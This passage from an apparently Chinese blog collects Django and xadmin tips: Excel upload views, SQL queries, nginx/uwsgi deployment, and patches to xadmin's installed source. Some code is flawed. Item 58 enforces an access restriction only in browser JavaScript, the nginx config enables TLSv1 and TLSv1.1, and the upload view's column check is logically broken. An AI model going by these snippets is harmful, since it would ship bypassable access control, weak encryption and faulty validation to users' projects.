&#39;/importkdorderno/&#39;\n            $.ajax(&#123;\n                url: url,\n                type: &#39;POST&#39;,\n                data: form_data,\n                dataType: &quot;json&quot;,\n                beforeSend: function (xhr) &#123;\n                    xhr.setRequestHeader(&quot;X-CSRFToken&quot;, $.getCookie(&quot;csrftoken&quot;))\n                &#125;,\n                processData: false,  // tell jquery not to process the data\n                contentType: false, // tell jquery not to set contentType\n                success: function (res) &#123;\n\n                    alert(res.msg);\n                    window.location.reload();\n                &#125;,\n                error: function (err) &#123;\n                &#125;\n            &#125;);\n        &#125;);\n    &#125;)\n&lt;/script&gt;\n</code></pre>\n<p>​<br>3、在views.py处理上传的excel文件</p>\n<pre><code>import pandas as pd\nfrom rest_framework.views import APIView\n\nclass ImportKDOrderNo(APIView):\n\n    def post(self, request, *args, **kwargs):\n        file = request.FILES.get(&#39;file&#39;)\n        # read = InMemoryUploadedFile().open()\n        data = pd.read_excel(file)  # 使用pandas处理excel文件\n        file_source = request.POST.get(&#39;file_source&#39;, &#39;&#39;)  # 文件来源\n        \n        if &#39;订单号&#39; and &#39;物流单号&#39; not in data:\n            return Response(data=&#123;&#39;msg&#39;: &#39;文件格式有误，第一行第一列应该为【订单号】，第一行第二列应该为【物流单号】&#39;&#125;)\n        ordernos = data[&#39;订单号&#39;]\n        logistics = data[&#39;物流单号&#39;]\n        for i in range(len(ordernos)):\n            print(&#39;订单号&#39;, ordernos[i], &#39;物流单号&#39;, logistics[i])\n          \n        return Response(data=&#123;&#39;msg&#39;: &#39;上传成功&#39;&#125;)\n</code></pre>\n<p>4、在urls.py中添加访问路由</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">from django.urls import path</span><br><span class=\"line\">from 你的应用名称 import views</span><br><span class=\"line\"></span><br><span class=\"line\">app_name = &#x27;你的应用名称&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">urlpatterns = [</span><br><span class=\"line\">    # 其他路由</span><br><span class=\"line\">    ...</span><br><span class=\"line\">    # 导入物流单号</span><br><span class=\"line\">    path(&#x27;importkdorderno/&#x27;, views.ImportKDOrderNo.as_view(), name=&#x27;importkdorderno&#x27;),</span><br><span class=\"line\">]</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"54、Django中查找今天进账金额\"><a href=\"#54、Django中查找今天进账金额\" class=\"headerlink\" title=\"54、Django中查找今天进账金额\"></a>54、Django中查找今天进账金额</h2><p>views.py</p>\n<pre><code>from datetime import datetime\nclass CountFee(APIView):\n    def get(self, request, *args, **kwargs):\n        # 获取当前时间的年月日，然后使用聚合函数添加fee字段的值\n        year = datetime.now().year\n        month = datetime.now().month\n        day = datetime.now().day\n        count_fees = FeeDetail.objects.filter(addtime__year=year, addtime__month=month, addtime__day=day).aggregate(Sum(&#39;fee&#39;))\n        all_fee = count_fees[&#39;fee__sum&#39;] if count_fees[&#39;fee__sum&#39;] else 0\n        print(all_fee)\n        return Response(&#123;&#39;code&#39;: 1, &#39;msg&#39;: &#39;success&#39;, &#39;data&#39;: &#123;&#39;all_fee&#39;: all_fee&#125;&#125;)\n</code></pre>\n<h2 id=\"55、判断是什么系统\"><a href=\"#55、判断是什么系统\" class=\"headerlink\" title=\"55、判断是什么系统\"></a>55、判断是什么系统</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">import platform</span><br><span class=\"line\">PlATFORM = platform.system()</span><br><span class=\"line\">if PlATFORM == &quot;Linux&quot;:</span><br><span class=\"line\">    print(&#x27;linux&#x27;)</span><br><span class=\"line\">else:</span><br><span class=\"line\">    print(&#x27;其他&#x27;) </span><br></pre></td></tr></table></figure>\n\n<h2 id=\"56、sql查询\"><a href=\"#56、sql查询\" class=\"headerlink\" title=\"56、sql查询\"></a>56、sql查询</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 联合更新</span><br><span class=\"line\">update malluser set master_master_id=3 where master_id in (select a.id from (select id from  malluser where id like &#x27;15%&#x27;)a) </span><br><span class=\"line\"># 统计某字段重复数据</span><br><span class=\"line\">SELECT phone, COUNT(*) AS sumCount FROM malluser GROUP BY phone HAVING sumCount &gt; 1;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"57、-xadmin后台删除数据出现错误\"><a href=\"#57、-xadmin后台删除数据出现错误\" class=\"headerlink\" title=\"57、 xadmin后台删除数据出现错误\"></a>57、 xadmin后台删除数据出现错误</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">`get_deleted_objects() takes 3 positional arguments but 5 were given`</span><br></pre></td></tr></table></figure>\n\n<p>这是由于Django2.1版本和xadmin不兼容导致的</p>\n<p>知道虚拟环境\\Lib\\site-packages\\xadmin\\plugins\\actions.py</p>\n<p>修改93行，</p>\n<p>把</p>\n<pre><code>deletable_objects, model_count, perms_needed, protected = get_deleted_objects(\n            queryset, self.opts, self.user, self.admin_site, using)\n</code></pre>\n<p>改为</p>\n<pre><code>deletable_objects, model_count, perms_needed, protected = get_deleted_objects(\n            queryset, self.user, self.admin_site)\n</code></pre>\n<p>然后在adminx.py文件中对应的模型类中允许删除</p>\n<pre><code>class MaterialAdmin(object):\n    &quot;&quot;&quot;素材库分类&quot;&quot;&quot;\n    list_display = [&#39;id&#39;, &#39;name&#39;, &#39;class_id&#39;, &#39;is_delete&#39;, &#39;addtime&#39;]\n  \n    def has_delete_permission(self, *args, **kwargs):\n        return True\n</code></pre>\n<h2 id=\"58、xdamin限制用户点击\"><a href=\"#58、xdamin限制用户点击\" class=\"headerlink\" title=\"58、xdamin限制用户点击\"></a>58、xdamin限制用户点击</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">//如果登录z=xadmin后台的账号不是【root】的就不能点击更新操作</span><br><span class=\"line\">    var master_name = $(&#x27;#top-nav&#x27;).find(&#x27;strong&#x27;).text();</span><br><span class=\"line\">        master_name =  master_name.substring(4);</span><br><span class=\"line\">    if(master_name != &#x27;root&#x27;)&#123;</span><br><span class=\"line\">            $(&quot;.grid-item a&quot;).each(function(index, element) &#123;</span><br><span class=\"line\">                $(this).attr(&#x27;href&#x27;,&#x27;#&#x27;);</span><br><span class=\"line\">            &#125;);</span><br><span class=\"line\">        &#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"59、获取公众号关注url\"><a href=\"#59、获取公众号关注url\" class=\"headerlink\" title=\"59、获取公众号关注url\"></a>59、获取公众号关注url</h2><p>在微信网页版，打开公众号，点击右上角“…”，在弹框中选择右下角中间的“查看历史记录”，然后在弹框中选择左上角倒数第一个，“用默认浏览器打开”，就可以在打开的浏览器中获取该公众号的关注url，当把这个url发给好友时，好友点开的就是去关注公众号的页面。</p>\n<h2 id=\"60、xadmin后台用户操作表权限\"><a href=\"#60、xadmin后台用户操作表权限\" class=\"headerlink\" title=\"60、xadmin后台用户操作表权限\"></a>60、xadmin后台用户操作表权限</h2><p>虚拟环境根目录\\Lib\\site-packages\\xadmin\\views\\base.py</p>\n<p>可以找到：</p>\n<p><img src=\"https://img-blog.csdnimg.cn/20190627140512311.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xtX2lzX2Rj,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></p>\n<p>在项目子应用下的adminx.py中使用</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">import xadmin</span><br><span class=\"line\"></span><br><span class=\"line\">from machine.models import Machine</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">class MachineAdmin(object):</span><br><span class=\"line\">    list_display = [&#x27;code&#x27;,]  # 显示的字段</span><br><span class=\"line\"></span><br><span class=\"line\">    search_fields = [&#x27;code&#x27;]  # 搜索的字段</span><br><span class=\"line\">    list_filter = [&#x27;code&#x27;, &#x27;is_delete&#x27;] # 过滤的字段</span><br><span class=\"line\">    ordering = (&#x27;-id&#x27;,) # 按id降序排序</span><br><span class=\"line\">    list_editable = [&#x27;is_delete&#x27;, ]  # 数据即时编辑</span><br><span class=\"line\">    list_per_page = 30  # 每页显示数据数量</span><br><span class=\"line\">    model_icon = &#x27;fa fa-cog fa-spin&#x27;  # 左侧显示的小图标</span><br><span class=\"line\"></span><br><span class=\"line\">    def has_delete_permission(self, *args, **kwargs): </span><br><span class=\"line\">        # 删除权限</span><br><span class=\"line\">        if self.request.user.is_superuser:  # 管理员才能增加</span><br><span class=\"line\">            return True</span><br><span class=\"line\">        return False</span><br><span class=\"line\"></span><br><span class=\"line\">    def has_add_permission(self, *args, **kwargs):</span><br><span class=\"line\">        if self.request.user.is_superuser:  # 管理员才能增加</span><br><span class=\"line\">            return True</span><br><span class=\"line\">        return False</span><br><span class=\"line\"></span><br><span class=\"line\">    def has_change_permission(self, *args, **kwargs):</span><br><span class=\"line\">        if self.request.user.is_superuser: # 管理员才能修改</span><br><span class=\"line\">            return True</span><br><span class=\"line\">        return False</span><br><span class=\"line\"></span><br><span class=\"line\">    def queryset(self):</span><br><span class=\"line\">        qs = super(MachineAdmin, self).queryset()</span><br><span class=\"line\">        if self.request.user.is_superuser:  # 管理员可以查看所有</span><br><span class=\"line\">            return qs</span><br><span class=\"line\">        else:</span><br><span class=\"line\">            # 登录用户只能看到自己修改的数据</span><br><span class=\"line\">            return qs.filter(master_id=self.request.user.last_name)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">xadmin.site.register(MallMachine, MallMachineAdmin)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"61、使用nginx部署项目\"><a href=\"#61、使用nginx部署项目\" class=\"headerlink\" title=\"61、使用nginx部署项目\"></a>61、使用nginx部署项目</h2><p>先在/etc/nginx/sites-available中创建一个配置文件，文件名为test(注意没有后缀):</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">#设定虚拟主机配置</span><br><span class=\"line\">    server &#123;</span><br><span class=\"line\">        #侦听80端口</span><br><span class=\"line\">        listen 80;</span><br><span class=\"line\">        listen 443 ssl;</span><br><span class=\"line\">        #定义使用 www.nginx.cn访问</span><br><span class=\"line\">\t\t#ssl on;</span><br><span class=\"line\">        server_name  xxx.xxx.com;</span><br><span class=\"line\">        #定义服务器的默认网站根目录位置</span><br><span class=\"line\">        root /root/项目名称;</span><br><span class=\"line\">\t\tssl_session_timeout 5m; </span><br><span class=\"line\">        ssl_certificate   /etc/nginx/cert/xxx.pem;</span><br><span class=\"line\">        ssl_certificate_key  /etc/nginx/cert/xxx.key;</span><br><span class=\"line\">        ssl_ciphers ECDHE-RSA-AES128-GCM-SHA256:ECDHE:ECDH:AES:HIGH:!NULL:!aNULL:!MD5:!ADH:!RC4;</span><br><span class=\"line\">        ssl_protocols TLSv1 TLSv1.1 TLSv1.2;</span><br><span class=\"line\">        ssl_prefer_server_ciphers on;</span><br><span class=\"line\">        #设定本虚拟主机的访问日志</span><br><span class=\"line\">        #access_log  logs/nginx.access.log  main;</span><br><span class=\"line\"> </span><br><span class=\"line\">        #默认请求</span><br><span class=\"line\">        location / &#123;</span><br><span class=\"line\">            #倒入了uwsgi的配置</span><br><span class=\"line\">            include uwsgi_params; </span><br><span class=\"line\">\t\t    client_max_body_size\t50m;</span><br><span class=\"line\">            #连接uwsgi的超时时间</span><br><span class=\"line\">           # uwsgi_connect_timeout 30; </span><br><span class=\"line\"> \t    #设定了uwsig服务器位置</span><br><span class=\"line\"> \t    \tuwsgi_pass 127.0.0.1:8002;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        </span><br><span class=\"line\">        location /static&#123;</span><br><span class=\"line\">      \talias /root/项目名称/static;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">\tlocation /media &#123;</span><br><span class=\"line\">\talias /root/项目名称/media;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>其中xxx.xxx.com表示域名.如果没有https，就使用#把ssl注释掉就可以了。</p>\n<p>然后把test映射到/etc/nginx/sites-enabled</p>\n<p>命令</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">ln -s /etc/nginx/sites-available/test /etc/nginx/sites-enabled/test</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>即可<br>注意：<br>uwsgi中配置listen=1024时，启动uwsgi时可能会报错：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">django + uwsgi + nginx 日志Listen queue size is greater than the system max net.core.somaxconn (128).</span><br></pre></td></tr></table></figure>\n\n<p>解决方法:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">修改系统参数</span><br><span class=\"line\"></span><br><span class=\"line\">/proc/sys/net/ipv4/tcp_max_syn_backlog  原来2048    改为8192</span><br><span class=\"line\">/proc/sys/net/core/somaxconn\t原来128     改为262144</span><br></pre></td></tr></table></figure>\n\n<p>重启nginx</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">nginx -s reload</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"62、xadmin后台发送邮件找回密码\"><a href=\"#62、xadmin后台发送邮件找回密码\" class=\"headerlink\" title=\"62、xadmin后台发送邮件找回密码\"></a>62、xadmin后台发送邮件找回密码</h2><p><img src=\"https://img-blog.csdnimg.cn/20190710230444358.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xtX2lzX2Rj,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></p>\n<p>输入你用户绑定的邮箱</p>\n<p><img src=\"https://img-blog.csdnimg.cn/20190710230454725.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xtX2lzX2Rj,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></p>\n<p>想要发送邮件，需要在settings.py中设置邮件发送器</p>\n<p>settings.py最下面增加</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># ------------------------邮箱配置-----------------------------------------</span><br><span class=\"line\">EMAIL_BACKEND = &#x27;django.core.mail.backends.smtp.EmailBackend&#x27; #把要发送的邮件显示再控制台上，方便调试</span><br><span class=\"line\">EMAIL_USE_SSL = True</span><br><span class=\"line\">EMAIL_HOST = &#x27;smtp.qq.com&#x27;  # 如果是 163 改成 smtp.163.com</span><br><span class=\"line\">EMAIL_PORT = 465</span><br><span class=\"line\">EMAIL_HOST_USER = &#x27;邮箱账号&#x27; # 帐号</span><br><span class=\"line\">EMAIL_HOST_PASSWORD = &#x27;授权码&#x27;  # 到邮箱里开通</span><br><span class=\"line\">DEFAULT_FROM_EMAIL = EMAIL_HOST_USER</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>由于django2与xadmin有些地方不兼容，需要修改源码：</p>\n<p>找到虚拟环境根目录\\Lib\\site-packages\\xadmin\\plugins\\passwords.py</p>\n<p>在passwords.py文件中大概79行，修改为</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">return password_reset_confirm(request=request, uidb36=uidb36, token=token,</span><br><span class=\"line\">                                      template_name=self.password_reset_confirm_template,</span><br><span class=\"line\">                                      token_generator=self.password_reset_token_generator,</span><br><span class=\"line\">                                      set_password_form=self.password_reset_set_form,</span><br><span class=\"line\">                                      post_reset_redirect=self.get_admin_url(&#x27;xadmin_password_reset_complete&#x27;),</span><br><span class=\"line\">                                      current_app=self.admin_site.name, extra_context=context).dispatch(request=request,</span><br><span class=\"line\">                                                                                                        uidb64=uidb36,token=token)</span><br><span class=\"line\">             </span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>找到虚拟环境根目录Lib\\site-packages\\django\\contrib\\auth\\views.py</p>\n<p>在views.py文件中大概258行，增加：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 成功后跳转路由,根据自己实际来定</span><br><span class=\"line\">self.success_url = self.request.build_absolute_uri(&#x27;/&#x27;) + &#x27;xadmin/&#x27;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://img-blog.csdnimg.cn/2020052620533440.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xtX2lzX2Rj,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></p>\n<h2 id=\"63、xadmin外键下拉框添加过滤\"><a href=\"#63、xadmin外键下拉框添加过滤\" class=\"headerlink\" title=\"63、xadmin外键下拉框添加过滤\"></a>63、xadmin外键下拉框添加过滤</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">class MallGoodsAdmin(object):</span><br><span class=\"line\">    &quot;&quot;&quot;商品管理&quot;&quot;&quot;</span><br><span class=\"line\">    list_display = [&#x27;id&#x27;, &#x27;show_photo&#x27;, &#x27;nickname&#x27;, &#x27;merchant&#x27;, &#x27;goods_class&#x27;, &#x27;label&#x27;,]</span><br><span class=\"line\">    search_fields = [&#x27;nickname&#x27;]</span><br><span class=\"line\">    list_filter = [&#x27;goods_class&#x27;, &#x27;label&#x27;,]</span><br><span class=\"line\">    model_icon = &#x27;fa fa-bars&#x27;</span><br><span class=\"line\">    list_editable = [&#x27;goods_class&#x27;, ]</span><br><span class=\"line\">    #,重写虚拟环境根目录下\\Lib\\site-packages\\xadmin\\views\\edit.py中的formfield_for_dbfield</span><br><span class=\"line\">    def formfield_for_dbfield(self, db_field, **kwargs):</span><br><span class=\"line\">        # 对MallGoodsClass这个表项的下拉框选择进行过滤</span><br><span class=\"line\">        # MallGoods中有一个goods_class商品分类外键MallGoodsClass，过滤掉外键MallGoodsClass中 </span><br><span class=\"line\">        # master_class为空的值</span><br><span class=\"line\">        if db_field.name == &quot;goods_class&quot;:</span><br><span class=\"line\">            kwargs[&quot;queryset&quot;] = MallGoodsClass.objects.filter(master_class__isnull=False)</span><br><span class=\"line\">            # 对assigned_recipient这个表项的下拉选择进行过滤</span><br><span class=\"line\">        \treturn db_field.formfield(**dict(**kwargs))</span><br><span class=\"line\">        return super().formfield_for_dbfield(db_field, **kwargs)</span><br><span class=\"line\"></span><br><span class=\"line\">xadmin.site.register(models.MallGoods, MallGoodsAdmin)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"64、xadmin即时编辑器去掉空标签\"><a href=\"#64、xadmin即时编辑器去掉空标签\" class=\"headerlink\" title=\"64、xadmin即时编辑器去掉空标签\"></a>64、xadmin即时编辑器去掉空标签</h2><p><img src=\"https://img-blog.csdnimg.cn/20190716151440115.png\" alt=\"在这里插入图片描述\"></p>\n<p>虚拟环境根目录下\\Lib\\site-packages\\xadmin\\plugins\\editable.py，在大概</p>\n<p>129行增加：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">form.fields[fields[0]].empty_label = None</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://img-blog.csdnimg.cn/20190716151459680.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xtX2lzX2Rj,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></p>\n<h2 id=\"65、用户增加的小组件，让其他用户可见\"><a href=\"#65、用户增加的小组件，让其他用户可见\" class=\"headerlink\" title=\"65、用户增加的小组件，让其他用户可见\"></a>65、用户增加的小组件，让其他用户可见</h2><p>找到虚拟环境根目录\\Lib\\site-packages\\xadmin\\views\\dashboard.py</p>\n<p>在548行、554行</p>\n<p><img src=\"https://img-blog.csdnimg.cn/20190723175537371.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xtX2lzX2Rj,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></p>\n<p>改为：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">@filter_hook</span><br><span class=\"line\">    def get_widgets(self):</span><br><span class=\"line\"></span><br><span class=\"line\">        if self.widget_customiz:</span><br><span class=\"line\">            portal_pos = UserSettings.objects.filter(</span><br><span class=\"line\">               key=self.get_portal_key())</span><br><span class=\"line\">            if len(portal_pos):</span><br><span class=\"line\">                portal_pos = portal_pos[0].value</span><br><span class=\"line\">                widgets = []</span><br><span class=\"line\"></span><br><span class=\"line\">                if portal_pos:</span><br><span class=\"line\">                    user_widgets = dict([(uw.id, uw) for uw in UserWidget.objects.filter(page_id=self.get_page_id())])</span><br><span class=\"line\">                    for col in portal_pos.split(&#x27;|&#x27;):</span><br><span class=\"line\">                        ws = []</span><br><span class=\"line\">                        for wid in col.split(&#x27;,&#x27;):</span><br><span class=\"line\">                            try:</span><br><span class=\"line\">                                widget = user_widgets.get(int(wid))</span><br><span class=\"line\">                                if widget:</span><br><span class=\"line\">                                    ws.append(self.get_widget(widget))</span><br><span class=\"line\">                            except Exception as e:</span><br><span class=\"line\">                                import logging</span><br><span class=\"line\">                                logging.error(e, exc_info=True)</span><br><span class=\"line\">                        widgets.append(ws)</span><br><span class=\"line\"></span><br><span class=\"line\">                return widgets</span><br><span class=\"line\"></span><br><span class=\"line\">        return self.get_init_widget()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"66、pip-install-uwsgi出错\"><a href=\"#66、pip-install-uwsgi出错\" class=\"headerlink\" title=\"66、pip install uwsgi出错\"></a>66、pip install uwsgi出错</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">plugins/python/uwsgi_python.h:2:20: fatal error: Python.h: No such file or directory</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>首先安装python3环境</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">apt install python3-dev</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>然后再虚拟环境中</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">pip install uwsgi</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"66、xadmin后台加载数据慢，解决方案\"><a href=\"#66、xadmin后台加载数据慢，解决方案\" class=\"headerlink\" title=\"66、xadmin后台加载数据慢，解决方案\"></a>66、xadmin后台加载数据慢，解决方案</h2><p>list_filter: 过滤器要慎用，不要使用类似id这些数据量大的字段</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">class MallUserAdmin(object):</span><br><span class=\"line\">    &quot;&quot;&quot;用户管理&quot;&quot;&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">    list_display = [&#x27;id&#x27;, &#x27;tp_icon&#x27;, &#x27;nickname&#x27;, &#x27;phone&#x27;, &#x27;level&#x27;, &#x27;balance&#x27;, &#x27;province&#x27;, &#x27;city&#x27;, &#x27;quxian&#x27;]  # 显示字段</span><br><span class=\"line\">    search_fields = [&#x27;id&#x27;, &#x27;nickname&#x27;, &#x27;phone&#x27;]  # 搜索</span><br><span class=\"line\">    list_filter = [&#x27;level&#x27;, &#x27;province&#x27;, &#x27;city&#x27;, &#x27;quxian&#x27;]  # 过滤器</span><br><span class=\"line\">    # list_filter = [&#x27;id&#x27;, &#x27;level&#x27;, &#x27;province&#x27;, &#x27;city&#x27;, &#x27;quxian&#x27;]  # 如果加id，xadmin加载回来的数据就会很慢，所以不要在过滤器上使用id</span><br><span class=\"line\">    list_per_page = 30  # 默认每页数量</span><br><span class=\"line\">    model_icon = &#x27;fa fa-users&#x27;  # 左侧图标</span><br><span class=\"line\">    ordering = [&#x27;-id&#x27;]  # 排序</span><br><span class=\"line\">    readonly_fields = [&#x27;subscribe&#x27;, &#x27;wx_openid&#x27;, &#x27;phone&#x27;]  # 只读字段</span><br><span class=\"line\">    is_addbalance = True   # 加载自定义的插件</span><br><span class=\"line\">    relfield_style = &#x27;fk-ajax&#x27;  # 其他表如果外键到用户表就做ajax搜索查询，不一次性加载数据</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"67-、xadmin导出插件处理，增加导出勾选数据项\"><a href=\"#67-、xadmin导出插件处理，增加导出勾选数据项\" class=\"headerlink\" title=\"67 、xadmin导出插件处理，增加导出勾选数据项\"></a>67 、xadmin导出插件处理，增加导出勾选数据项</h2><p>常规的导出只有两个选择【导出表头】、【导出全部数据】</p>\n<p><img src=\"https://img-blog.csdnimg.cn/20190917141511283.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xtX2lzX2Rj,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></p>\n<p>现在想要做的是增加一个选择，即【导出表头】、【导出全部数据】、【导出勾选数据】，如下图：</p>\n<p><img src=\"https://img-blog.csdnimg.cn/20190917141839822.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xtX2lzX2Rj,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></p>\n<p>需要修改xadmin源代码，具体如下</p>\n<h4 id=\"1、加载js文件\"><a href=\"#1、加载js文件\" class=\"headerlink\" title=\"1、加载js文件\"></a>1、加载js文件</h4><p>找到虚拟环境\\Lib\\site-packages\\xadmin\\views\\list.py，在607行增加’xadmin.plugin.importexport.js’，如下图所示</p>\n<p><img src=\"https://img-blog.csdnimg.cn/20190917141853832.png\" alt=\"在这里插入图片描述\"></p>\n<h4 id=\"2、修改export-py，后端处理下载文件\"><a href=\"#2、修改export-py，后端处理下载文件\" class=\"headerlink\" title=\"2、修改export.py，后端处理下载文件\"></a>2、修改export.py，后端处理下载文件</h4><p>找到虚拟环境\\Lib\\site-packages\\xadmin\\plugins\\export.py</p>\n<p>在84行把rows = context[‘results’]修改成如下函数</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 新增导出所选数据</span><br><span class=\"line\"># rows = context[&#x27;results&#x27;]  </span><br><span class=\"line\">rows = []</span><br><span class=\"line\">select_across = self.request.GET.get(&#x27;_select_across&#x27;, False) == &#x27;1&#x27;</span><br><span class=\"line\">selected = self.request.GET.get(&#x27;_selected_actions&#x27;, &#x27;&#x27;)</span><br><span class=\"line\">if self.request.GET.get(&#x27;selected&#x27;, &#x27;off&#x27;) == &#x27;on&#x27;:</span><br><span class=\"line\">    if not select_across:</span><br><span class=\"line\">        selected_pk = selected.split(&#x27;,&#x27;)</span><br><span class=\"line\">        for i in context[&#x27;results&#x27;]:</span><br><span class=\"line\">            if str(i[&#x27;object&#x27;].id) in selected_pk:</span><br><span class=\"line\">                rows.append(i)</span><br><span class=\"line\">    else:</span><br><span class=\"line\">        rows = context[&#x27;results&#x27;]</span><br><span class=\"line\">else:</span><br><span class=\"line\">    rows = context[&#x27;results&#x27;]</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://img-blog.csdnimg.cn/2019091714200418.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xtX2lzX2Rj,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></p>\n<p>3、 修改model_list.top_toolbar.exports.html<br>找到虚拟环境\\Lib\\site-packages\\xadmin\\templates\\xadmin\\blocks\\model_list.top_toolbar.exports.html</p>\n<p>使用以下代码覆盖原文件</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#123;% load i18n %&#125;</span><br><span class=\"line\">&lt;div class=&quot;btn-group export&quot;&gt;</span><br><span class=\"line\">    &lt;a id=&quot;export-menu&quot; class=&quot;dropdown-toggle btn btn-default btn-sm&quot; data-toggle=&quot;dropdown&quot; href=&quot;#&quot;&gt;</span><br><span class=\"line\">        &lt;i class=&quot;fa fa-share&quot;&gt;&lt;/i&gt; &#123;% trans &quot;Export&quot; %&#125; &lt;span class=&quot;caret&quot;&gt;&lt;/span&gt;</span><br><span class=\"line\">    &lt;/a&gt;</span><br><span class=\"line\">    &lt;ul class=&quot;dropdown-menu&quot; role=&quot;menu&quot; aria-labelledby=&quot;dLabel&quot;&gt;</span><br><span class=\"line\">        &#123;% for et in export_types %&#125;</span><br><span class=\"line\">        &lt;li&gt;&lt;a data-toggle=&quot;modal&quot; data-target=&quot;#export-modal-&#123;&#123;et.type&#125;&#125;&quot;&gt;&lt;i class=&quot;fa fa-arrow-circle-down&quot;&gt;</span><br><span class=\"line\">        &lt;/i&gt; &#123;% trans &quot;Export&quot; %&#125; &#123;&#123;et.name&#125;&#125;&lt;/a&gt;&lt;/li&gt;</span><br><span class=\"line\">        &#123;% endfor %&#125;</span><br><span class=\"line\">    &lt;/ul&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#123;% for et in export_types %&#125;</span><br><span class=\"line\">    &lt;div id=&quot;export-modal-&#123;&#123;et.type&#125;&#125;&quot; class=&quot;modal fade&quot;&gt;</span><br><span class=\"line\">        &lt;div 